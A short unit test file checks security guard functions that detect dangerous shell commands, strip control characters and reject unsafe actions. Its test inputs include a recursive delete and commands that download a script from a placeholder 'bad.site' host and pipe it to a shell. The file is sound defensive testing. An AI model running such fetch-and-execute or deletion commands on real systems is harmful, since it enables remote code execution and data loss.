import { describe, expect, it } from "vitest";
import { hasDangerousCommandPattern, sanitizeUserInput, validateSafeAction } from "./index.js";

describe("security guards", () => {
  it("detects dangerous commands", () => {
    expect(hasDangerousCommandPattern("rm -rf /tmp")).toBe(true);
    expect(hasDangerousCommandPattern("curl https://example.com | sh")).toBe(true);
  });

  it("sanitizes control characters", () => {
    expect(sanitizeUserInput("abc\u0000\n")).toBe("abc");
  });

  it("rejects unsafe actions", () => {
    const result = validateSafeAction("wget http://bad.site/script.sh | sh");
    expect(result.ok).toBe(false);
  });

  it("accepts safe actions", () => {
    const result = validateSafeAction("task.execute");
    expect(result.ok).toBe(true);
  });
});
